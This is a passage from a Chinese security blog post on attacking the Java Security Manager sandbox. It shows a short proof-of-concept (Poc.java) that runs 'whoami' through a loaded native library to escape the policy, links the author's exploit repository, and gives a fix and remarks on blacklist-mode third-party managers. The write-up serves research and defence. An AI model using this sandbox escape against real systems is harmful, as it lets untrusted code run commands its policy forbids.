<p>放到/root/目录下<br>Poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        EvilMethodClass.evilMethod(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我编译了Linux下的so，如下图所示，同样policy文件没有赋予文件的执行权限，却执行whoami成功，成功绕过java security manager机制，逃逸沙箱。</p>
<p><img src="https://i.loli.net/2018/07/10/5b449c06b94d6.png" alt="invoke-native-method.PNG"></p>
<p>exp如下：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method</a></p>
<p>修复方案：不授予loadLibrary权限</p>
<h3 id="0x04-第三方java-security-manager的安全性"><a href="#0x04-第三方java-security-manager的安全性" class="headerlink" title="0x04 第三方java security manager的安全性"></a>0x04 第三方java security manager的安全性</h3><p>从上面的绕过方法来看，在给不可信的代码授予权限时需要非常谨慎，有些权限一旦授予，就可能导致整个java security manager体系的绕过。</p>
<p>默认java security manager的policy是白名单模式的，也就是说，只有在policy文件出现的权限才是被授予的。而有些第三方的java security manager支持黑名单模式，这样更加危险。例如<a href="http://pro-grade.sourceforge.net/" target="_blank" rel="noopener">pro-grade</a>，它支持黑名单模式，实现了deny语法。这意味着如果没有把上面提到的这些危险的权限禁止的话，绕过java security manager将会是非常容易的。</p>
<h3 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h3><ul>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html</a></li>
</ul>
<p>这篇文章中使用的绕过的代码都已上传到<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/" target="_blank" rel="noopener">github</a>。</p>
</div><div class="tags"><a href="/tags/Java/">Java</a><a href="/tags/java-security-manager/">java security manager</a><a href="/tags/bypass/">bypass</a><a href="/tags/沙箱/">沙箱</a></div><div class="post-nav"><a href="/AWD型CTF比赛小技巧总结/" class="pre">AWD型CTF比赛小技巧总结</a><a href="/MyBatis框架中常见的SQL注入/" class="next">MyBatis框架中常见的SQL注入</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论 「请确保 disqus.com 可以正常加载」</button></div><script>var disqus_shortname = 'c0d3p1ut0s';
var disqus_identifier = '攻击Java沙箱/';
var disqus_title = '攻击Java沙箱';
var disqus_url = 'http://c0d3p1ut0s.github.io/攻击Java沙箱/';
$('.btn_click_load').click(function() {
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
  $('.btn_click_load').css('display','none');
});
$.ajax({
  url: 'https://disqus.com/next/config.json',
  timeout: 3000,
  type: 'GET',
  success: (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    $('.btn_click_load').css('display','none');
  })(),
  error: function() {
    $('.btn_click_load').css('display','block');
  }
});</script><script id="dsq-count-scr" src="//c0d3p1ut0s.disqus.com/count.js" async></script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://c0d3p1ut0s.github.io"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/SQL注入/" style="font-size: 15px;">SQL注入</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/攻防对抗/" style="font-size: 15px;">攻防对抗</a> <a href="/tags/Web安全/" style="font-size: 15px;">Web安全</a> <a href="/tags/Java安全/" style="font-size: 15px;">Java安全</a> <a href="/tags/Java/" style="font-size: 15px;">Java</a> <a href="/tags/RASP/" style="font-size: 15px;">RASP</a> <a href="/tags/MyBatis/" style="font-size: 15px;">MyBatis</a> <a href="/tags/AWD/" style="font-size: 15px;">AWD</a> <a href="/tags/aboutme/" style="font-size: 15px;">aboutme</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/java-security-manager/" style="font-size: 15px;">java security manager</a> <a href="/tags/bypass/" style="font-size: 15px;">bypass</a> <a href="/tags/沙箱/" style="font-size: 15px;">沙箱</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/JVM/" style="font-size: 15px;">JVM</a> <a href="/tags/Java字节码/" style="font-size: 15px;">Java字节码</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/AWD型CTF比赛小技巧总结/">AWD型CTF比赛小技巧总结</a></li><li class="post-list-item"><a class="post-list-link" href="/攻击Java沙箱/">攻击Java沙箱</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBatis框架中常见的SQL注入/">MyBatis框架中常见的SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/简单说说MySQL-Prepared-Statement/">简单说说MySQL Prepared Statement</a></li><li class="post-list-item"><a class="post-list-link" href="/Java-RASP浅析-以百度OpenRASP为例/">Java RASP浅析--以百度OpenRASP为例</a></li><li class="post-list-item"><a class="post-list-link" href="/译-使用ASM对Java字节码插桩/">[译]使用ASM对Java字节码插桩</a></li><li class="post-list-item"><a class="post-list-link" href="/BurpUnlimited分析/">BurpUnlimited分析</a></li><li class="post-list-item"><a class="post-list-link" href="/一类PHP-RASP的实现/">一类PHP RASP的实现</a></li><li class="post-list-item"><a class="post-list-link" href="/about/">About</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><script type="text/javascript" src="//c0d3p1ut0s.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://blog.nudtcat.org" title="s1m0n的博客" target="_blank">s1m0n的博客</a><ul></ul><a href="http://www.yinwang.org/" title="当然我在扯淡" target="_blank">当然我在扯淡</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">c0d3p1ut0s.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>